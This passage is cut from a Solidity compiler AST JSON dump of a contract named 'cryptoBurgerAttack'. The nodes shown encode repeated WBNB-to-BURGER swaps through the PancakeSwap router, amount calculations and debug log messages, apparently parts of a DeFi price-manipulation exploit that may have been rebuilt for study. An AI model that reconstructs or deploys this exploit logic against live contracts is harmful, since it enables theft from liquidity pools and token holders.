                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 606,
                            "name": "WBNB_interface",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 52,
                            "src": "6588:14:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$1557",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 607,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 1507,
                          "src": "6588:24:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 612,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "6588:39:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 604,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "6531:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 613,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "6531:106:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 614,
                  "nodeType": "EmitStatement",
                  "src": "6526:111:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 616,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "6654:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 617,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "6660:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 618,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "6668:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 620,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 619,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "6681:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "6668:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 621,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "6685:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 626,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "6704:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 625,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "6696:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 624,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "6696:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 627,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "6696:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 623,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "6688:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 622,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "6688:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 628,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "6688:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 615,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "6647:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 629,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "6647:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 630,
                  "nodeType": "ExpressionStatement",
                  "src": "6647:64:0"
                },
                {
                  "expression": {
                    "id": 639,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 631,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "6721:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 636,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "6800:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 637,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "6829:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 633,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "6753:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 632,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "6736:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 634,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "6736:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 635,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "6736:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 638,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "6736:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "6721:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 640,
                  "nodeType": "ExpressionStatement",
                  "src": "6721:122:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "57424e422062616c616e6365206f6620636f6e7472616374",
                        "id": 642,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "6875:26:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        "value": "WBNB balance of contract"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 647,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "6948:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 646,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "6940:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 645,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "6940:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 648,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "6940:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "expression": {
                            "id": 643,
                            "name": "WBNB_interface",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 52,
                            "src": "6915:14:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_IERC20_$1557",
                              "typeString": "contract IERC20"
                            }
                          },
                          "id": 644,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "balanceOf",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 1507,
                          "src": "6915:24:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_view$_t_address_$returns$_t_uint256_$",
                            "typeString": "function (address) view external returns (uint256)"
                          }
                        },
                        "id": 649,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "functionCall",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "6915:39:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_7575a5177a6343dd27028acb67bfdfd0026d0b9e8d1d13201741f79539bc7845",
                          "typeString": "literal_string \"WBNB balance of contract\""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 641,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "6858:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 650,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "6858:106:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 651,
                  "nodeType": "EmitStatement",
                  "src": "6853:111:0"
                },
                {
                  "eventCall": {
                    "arguments": [
                      {
                        "hexValue": "5468652072657175697265642057424e4220616d6f756e7420666f722031394d204255524720746f6b656e2061667465722038746820737761703a20",
                        "id": 653,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "6996:62:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_fb9be05c923753516326e268ca9cfc685d81cbd82b8b5a57f45a42d5406c1c25",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token after 8th swap: \""
                        },
                        "value": "The required WBNB amount for 19M BURG token after 8th swap: "
                      },
                      {
                        "baseExpression": {
                          "id": 654,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "7072:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 656,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 655,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "7085:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "7072:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_fb9be05c923753516326e268ca9cfc685d81cbd82b8b5a57f45a42d5406c1c25",
                          "typeString": "literal_string \"The required WBNB amount for 19M BURG token after 8th swap: \""
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 652,
                      "name": "LOG",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 64,
                      "src": "6979:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_event_nonpayable$_t_string_memory_ptr_$_t_uint256_$returns$__$",
                        "typeString": "function (string memory,uint256)"
                      }
                    },
                    "id": 657,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "6979:118:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 658,
                  "nodeType": "EmitStatement",
                  "src": "6974:123:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 660,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "7114:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 661,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "7120:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 662,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "7128:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 664,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 663,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "7141:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "7128:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 665,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "7145:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 670,
                                "name": "this",
                                "nodeType": "Identifier",
                                "overloadedDeclarations": [],
                                "referencedDeclaration": -28,
                                "src": "7164:4:0",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              }
                            ],
                            "expression": {
                              "argumentTypes": [
                                {
                                  "typeIdentifier": "t_contract$_cryptoBurgerAttack_$1472",
                                  "typeString": "contract cryptoBurgerAttack"
                                }
                              ],
                              "id": 669,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "lValueRequested": false,
                              "nodeType": "ElementaryTypeNameExpression",
                              "src": "7156:7:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_type$_t_address_$",
                                "typeString": "type(address)"
                              },
                              "typeName": {
                                "id": 668,
                                "name": "address",
                                "nodeType": "ElementaryTypeName",
                                "src": "7156:7:0",
                                "typeDescriptions": {}
                              }
                            },
                            "id": 671,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "kind": "typeConversion",
                            "lValueRequested": false,
                            "names": [],
                            "nodeType": "FunctionCall",
                            "src": "7156:13:0",
                            "tryCall": false,
                            "typeDescriptions": {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          }
                        ],
                        "expression": {
                          "argumentTypes": [
                            {
                              "typeIdentifier": "t_address",
                              "typeString": "address"
                            }
                          ],
                          "id": 667,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "lValueRequested": false,
                          "nodeType": "ElementaryTypeNameExpression",
                          "src": "7148:8:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_type$_t_address_payable_$",
                            "typeString": "type(address payable)"
                          },
                          "typeName": {
                            "id": 666,
                            "name": "address",
                            "nodeType": "ElementaryTypeName",
                            "src": "7148:8:0",
                            "stateMutability": "payable",
                            "typeDescriptions": {}
                          }
                        },
                        "id": 672,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "kind": "typeConversion",
                        "lValueRequested": false,
                        "names": [],
                        "nodeType": "FunctionCall",
                        "src": "7148:22:0",
                        "tryCall": false,
                        "typeDescriptions": {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        {
                          "typeIdentifier": "t_address_payable",
                          "typeString": "address payable"
                        }
                      ],
                      "id": 659,
                      "name": "swapIt",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1467,
                      "src": "7107:6:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_uint256_$_t_address_$returns$__$",
                        "typeString": "function (address,address,uint256,uint256,address)"
                      }
                    },
                    "id": 673,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "7107:64:0",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 674,
                  "nodeType": "ExpressionStatement",
                  "src": "7107:64:0"
                },
                {
                  "expression": {
                    "id": 683,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 675,
                      "name": "howMuchIneed",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 266,
                      "src": "7181:12:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 680,
                          "name": "max_BURG_amount",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 231,
                          "src": "7260:15:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        {
                          "id": 681,
                          "name": "path",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 240,
                          "src": "7289:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          },
                          {
                            "typeIdentifier": "t_array$_t_address_$dyn_memory_ptr",
                            "typeString": "address[] memory"
                          }
                        ],
                        "expression": {
                          "arguments": [
                            {
                              "id": 677,
                              "name": "PANCAKE_SWAP_ROUTER",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 31,
                              "src": "7213:19:0",
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 676,
                            "name": "IPancakeRouter01",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1728,
                            "src": "7196:16:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_type$_t_contract$_IPancakeRouter01_$1728_$",
                              "typeString": "type(contract IPancakeRouter01)"
                            }
                          },
                          "id": 678,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "typeConversion",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "7196:37:0",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_contract$_IPancakeRouter01_$1728",
                            "typeString": "contract IPancakeRouter01"
                          }
                        },
                        "id": 679,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "getAmountsIn",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": 1612,
                        "src": "7196:50:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_external_view$_t_uint256_$_t_array$_t_address_$dyn_memory_ptr_$returns$_t_array$_t_uint256_$dyn_memory_ptr_$",
                          "typeString": "function (uint256,address[] memory) view external returns (uint256[] memory)"
                        }
                      },
                      "id": 682,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "7196:107:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                        "typeString": "uint256[] memory"
                      }
                    },
                    "src": "7181:122:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                      "typeString": "uint256[] memory"
                    }
                  },
                  "id": 684,
                  "nodeType": "ExpressionStatement",
                  "src": "7181:122:0"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 686,
                        "name": "WBNB",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 40,
                        "src": "7320:4:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 687,
                        "name": "BURGER",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 46,
                        "src": "7326:6:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "baseExpression": {
                          "id": 688,
                          "name": "howMuchIneed",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 266,
                          "src": "7334:12:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_array$_t_uint256_$dyn_memory_ptr",
                            "typeString": "uint256[] memory"
                          }
                        },
                        "id": 690,
                        "indexExpression": {
                          "hexValue": "30",
                          "id": 689,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "7347:1:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        },
                        "isConstant": false,
                        "isLValue": true,
                        "isPure": false,
                        "lValueRequested": false,
                        "nodeType": "IndexAccess",
                        "src": "7334:15:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      },
                      {
                        "hexValue": "30",
                        "id": 691,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "7351:1:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_0_by_1",
                          "typeString": "int_const 0"
                        },
                        "value": "0"
                      },
                      {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "id": 696,
                                "name": "this",
